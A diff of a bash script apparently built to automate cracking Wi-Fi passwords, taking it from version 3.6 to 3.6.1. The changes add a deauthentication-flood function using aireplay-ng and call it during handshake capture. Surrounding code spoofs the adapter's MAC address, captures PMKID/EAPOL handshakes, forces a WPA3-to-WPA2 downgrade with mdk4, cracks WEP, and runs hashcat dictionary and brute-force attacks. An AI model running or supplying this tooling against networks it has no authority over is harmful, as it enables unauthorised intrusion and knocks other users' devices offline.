@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# version: 3.6 27/5/25 03:00
+# version: 3.6.1 27/5/25 20:00
 
 
 ### Changlog ###
@@ -41,14 +41,13 @@
 #			linux /live/vmlinuz-6.8.11-amd64 boot=live persistence components quiet splash noeject findiso=${iso_path} persistence nomodeset
 #			initrd /live/initrd.img-6.8.11-amd64
 # 		}
+# Versions: 
+# Hashcat 6.2.6, Aircrack-ng 1.7, hcxtools 6.3.5, MDK4 4.2
 #################################################################    
 
 
 
 
-# ----------------
-# Variables
-# ----------------
 UN=${SUDO_USER:-$(whoami)}
 current_date=$(date +"%d_%m_%y")
 targets_path="/home/$UN/Desktop/wifi_Targets"
@@ -79,60 +78,78 @@ chown -R $UN:$UN $targets_path
 
 
 
-# ------------------------------
-# Dependencies Installation
-# ------------------------------
-function install_dependencies() {
+
+function first_setup() {
+    echo -e "\n\n\033[1;34m[*] Checking and installing required packages...\033[0m"
     packages=("aircrack-ng" "gnome-terminal" "wget" "hashcat" "hcxtools" "macchanger" "mdk4" "gawk" "dbus-x11")
+    all_installed=true
+
     for package in "${packages[@]}"; do
         if ! dpkg -l | grep -q "^ii  $package "; then
-            echo -e "\nUpdating the repositories.."
-            apt update
-            echo "$package is not installed. Installing..."
-            apt install -y $package
+            echo -e "\n\033[1;33m[!] $package not found. Installing...\033[0m"
+            apt update -y >/dev/null
+            if apt install -y "$package" >/dev/null; then
+                echo -e "\033[1;32m[✔] $package installed successfully.\033[0m"
+            else
+                echo -e "\033[1;31m[✘] Failed to install $package.\033[0m"
+                all_installed=false
+            fi
+        else
+            echo -e "[✔] $package already installed."
         fi
     done
-}
 
+    if [ "$all_installed" = true ]; then
+        echo -e "\e[1m[✔] All dependencies are installed.\e[0m"
+    else
+        echo -e "\n\033[1;31m[✘] Some packages failed to install. Please check manually.\033[0m"
+    fi
 
-# ------------------------------
-# Check Wordlist and OUI file
-# ------------------------------
-function check_wordlist() {
-    # Check if /usr/share/wordlist directory exists, if not, create it
+    echo -e "\n\033[1;34m[*] Verifying wordlists and vendor data...\033[0m"
+
+    # Check and create wordlist directory
     if [ ! -d "$wordlists_dir" ]; then
         mkdir -p "$wordlists_dir"
-        echo "wordlist folder created"
+        echo -e "\033[1;33m[+] Wordlist directory created at $wordlists_dir\033[0m"
     fi
-    # Check if rockyou.txt exists, if yes, continue code
+
+    # Check rockyou.txt
     if [ -f "$rockyou_file" ]; then
-        echo
+        echo -e "[✔] Found rockyou.txt wordlist."
     else
-        # Check if rockyou.gz exists, if yes, unzip it
         if [ -f "$rockyou_gz" ]; then
-            echo -e "\n\nrockyou.gz found. Unzipping..."
+            echo -e "\033[1;33m[+] Unzipping rockyou.txt.gz...\033[0m"
             gzip -d "$rockyou_gz"
+            echo -e "\033[1;32m[✔] Unzipped rockyou.txt.\033[0m"
         else
-            echo -e "\n\nDownloading the rockyou wordlist file.\n"
-            wget -q -P $wordlists_dir https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
-            wait
+            echo -e "\033[1;33m[+] Downloading rockyou.txt...\033[0m"
+            wget -q -P "$wordlists_dir" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 
+            if [ -f "$rockyou_file" ]; then
+                echo -e "\033[1;32m[✔] rockyou.txt downloaded.\033[0m"
+            else
+                echo -e "\033[1;31m[✘] Failed to download rockyou.txt.\033[0m"
+            fi
         fi
     fi
 
-    # Check if oui.txt exists - for vendors names
+    # Check oui.txt for vendor lookups
     if [ -f "$oui_file" ]; then
-        echo
+        echo -e "[✔] Found OUI vendor file."
     else
-       echo -e "\n\nDownloading OUI file - Vendors detailes.\n"
-       wget -q https://raw.githubusercontent.com/idoCo10/OUI-list-2025/main/oui.txt -O  "$targets_path"/oui.txt
-       wait
-    fi         
+        echo -e "\033[1;33m[+] Downloading OUI vendor file...\033[0m"
+        wget -q https://raw.githubusercontent.com/idoCo10/OUI-list-2025/main/oui.txt -O "$targets_path"/oui.txt
+        if [ -f "$oui_file" ]; then
+            echo -e "\033[1;32m[✔] OUI vendor file downloaded.\033[0m"
+        else
+            echo -e "\033[1;31m[✘] Failed to download OUI vendor file.\033[0m"
+        fi
+    fi
+    echo -e "\n"
 }
 
 
-# ------------------------------
-# Adapter Configuration
-# ------------------------------
+
+
 function adapter_config() {
 	airmon-ng check kill > /dev/null 2>&1   # Kill interfering processes
 
@@ -175,12 +192,10 @@ function adapter_config() {
 }
 
 
-# ------------------------------
-# Change adapter mac address
-# ------------------------------
+
 function spoof_adapter_mac() {
 	# Spoof Adapter mac address to random address
-	echo -e "\nRandomizing our wifi adapter mac address:"
+	echo -e "\n\nRandomizing Wi-Fi adapter MAC address:"
 	
 	ifconfig ${wifi_adapter}mon down
         macchanger -r ${wifi_adapter}mon > /dev/null 2>&1
@@ -190,12 +205,10 @@ function spoof_adapter_mac() {
 }
 
 
-# ------------------------------
-# Network Scanner
-# ------------------------------
+
 function network_scanner() {	
         # Scan 15 seconds for wifi networks   
-        countdown_duration=15
+        countdown_duration=4
         gnome-terminal --geometry=110x35-10000-10000 -- bash -c "timeout ${countdown_duration}s airodump-ng --band abg ${wifi_adapter}mon --ignore-negative-one --output-format csv -w $targets_path/Scan/Scan-$current_date"        
 
         echo -e "\n\n\e[1;34mScanning available WiFi Networks ($countdown_duration s):\e[0m"
@@ -320,9 +333,7 @@ function network_scanner() {
 }
 
 
-# ------------------------------
-# Choose Network
-# ------------------------------
+
 function choose_network() {
     while :; do
         # Prompt the user to choose a row number
@@ -431,9 +442,7 @@ function choose_network() {
 }
 
 
-# ------------------------------
-# Validate Network
-# ------------------------------
+
 function validate_network() {
     echo -e "\e[1mValidating network:\e[0m"
     
@@ -465,9 +474,6 @@ function validate_network() {
 
 
 
-# ------------------------------------
-# Get the vendors names of the devices
-# ------------------------------------
 function get_oui_vendor() {
     local mac="$1"
     # If no argument is provided, use the global variable bssid_address
@@ -485,9 +491,6 @@ function get_oui_vendor() {
 
 
 
-# ------------------------------
-# Dvices Scanner
-# ------------------------------
 function devices_scanner() {
     seen_macs=()
     devices_header_shown=false
@@ -521,9 +524,12 @@ function devices_scanner() {
 
 
 
-# ------------------------------------------
-# Capture PMKID/EAPOL 
-# ------------------------------------------
+function deauth_attack() {
+    gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"mon
+}
+
+
+
 function capture_handshake() {
     pcapng_file="$targets_path/$bssid_name/hcxdump.pcapng"
     hash_file="$targets_path/$bssid_name/hash.hc22000"
@@ -544,7 +550,7 @@ function capture_handshake() {
         band=""
     fi
 
-    echo -e "\033[1;31m\033[1mStarting PMKID attack ->>\033[0m"
+    echo -e "\n\033[1;31m\033[1mStarting PMKID attack ->>\033[0m"
 
     # Start device scanner in background
     devices_scanner &
@@ -567,6 +573,7 @@ function capture_handshake() {
 
     while (( counter < max_tries )); do
         hcxpcapngtool -o "$hash_file" "$pcapng_file" &>/dev/null
+        deauth_attack
 
         if [[ -s "$hash_file" ]]; then
             #pmkid_count=$(grep -c '^WPA\*01\*' "$hash_file")
@@ -608,11 +615,6 @@ function capture_handshake() {
 
 
 
-
-
-# ------------------------------
-# Router with Mixed Encryption
-# ------------------------------
 function mixed_encryption() {
     echo -e "\033[1mThe Encryption is "$encryption".\033[0m \nThe devices may be using WPA3, we will try to trick them to switch to WPA2 so we could crack the password.\n"
     gnome-terminal --geometry=70x3-10000-10000 -- timeout 95s mdk4 $wifi_adapter"mon" b -n $bssid_name_original -c $channel -w a
@@ -621,9 +623,6 @@ function mixed_encryption() {
 
 
 
-# -------------------------
-# Crack WEP Encryption
-# -------------------------
 function crack_wep() {
     output_file="$targets_path/$bssid_name/WEP_output.txt"
     airodump_terminal_pid=""
@@ -747,9 +746,6 @@ function crack_wep() {
 }
 
 
-# -------------------------
-# Dictionary Attack
-# -------------------------
 
 function dictionary_attack() {
 while true; do
@@ -825,9 +821,6 @@ echo -e "\n\e[1mCracking Wi-Fi password using:\e[0m $dict_file \e[1m->>\e[0m\n"
 
 
 
-# ------------------------------
-# Brute-Force attack
-# ------------------------------
 function brute-force_attack() {
     
     echo -e "\e[1m\nCracking WiFi password with Hashcat ->>\e[0m\n"
@@ -998,11 +991,6 @@ function brute-force_attack() {
 
 
 
-
-
-# -----------------
-# Enable GPU
-# -----------------
 function enable_gpu() {
     # Check if running in a VM
     if [[ -n "$(systemd-detect-virt)" && "$(systemd-detect-virt)" != "none" ]]; then
@@ -1060,9 +1048,7 @@ function enable_gpu() {
 }
 
 
-# ------------------------------
-# Another Scan Prompt
-# ------------------------------
+
 function another_scan_prompt() {
     while true; do
         echo
@@ -1103,9 +1089,6 @@ function another_scan_prompt() {
 
 
 
-# ------------------------------
-# Cleanup
-# ------------------------------
 function cleanup() {
 	chown -R $UN:$UN $targets_path
 	gnome-terminal --geometry=1x1-10000-10000 -- airmon-ng stop "$wifi_adapter"mon
@@ -1113,9 +1096,7 @@ function cleanup() {
 }
 
 
-# ------------------------------
-# Choose Attack
-# ------------------------------
+
 function choose_attack() {
 	while true; do
 	    echo -e "\n\n\033[1;33mChoose how to Crack the Password:\e[0m"
@@ -1157,7 +1138,8 @@ function main_process() {
 	choose_attack
 }
 
-install_dependencies
-check_wordlist
+first_setup
 enable_gpu
 main_process
+
+
